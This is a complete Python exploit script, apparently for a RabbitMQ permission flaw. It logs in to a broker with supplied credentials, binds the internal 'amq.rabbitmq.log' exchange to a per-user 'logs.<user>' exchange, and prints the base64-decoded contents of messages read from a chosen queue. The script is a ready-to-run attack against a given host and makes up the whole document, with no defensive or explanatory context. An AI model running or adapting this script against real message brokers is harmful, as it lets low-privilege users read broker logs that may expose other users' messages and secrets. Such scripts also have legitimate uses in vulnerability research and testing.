#!/usr/bin/env python3

import string
import sys
import pika
import json
import base64
import ssl

def callback(ch, method, properties, body):
    msg = json.loads(body)
    print(base64.b64decode(msg['RawMessage']).decode('utf-8'))

def exploit(host, user, password, queue):
    credentials = pika.PlainCredentials(user, password)
    cxt = ssl.SSLContext(ssl.PROTOCOL_TLSv1_2)
    ssl_options = pika.SSLOptions(context=cxt)
    connection = pika.BlockingConnection(pika.ConnectionParameters(host=host, port=5672, credentials=credentials, ssl_options=ssl_options))
    channel = connection.channel()

    channel.basic_consume(queue=queue, auto_ack=True, on_message_callback=callback)

    logs_exchange = 'logs.' + user
    print("Binding 'amq.rabbitmq.log' exchange to '%s' exchange" % logs_exchange)
    channel.exchange_bind(logs_exchange, 'amq.rabbitmq.log', '#')

    channel.start_consuming()

    connection.close()

if __name__ == "__main__":
    if len(sys.argv) != 5:
        print("USAGE: %s <host> <user> <password> <error queue>" % sys.argv[0], file=sys.stderr)
        sys.exit(-1);
    else:
        exploit(sys.argv[1], sys.argv[2], sys.argv[3], sys.argv[4])
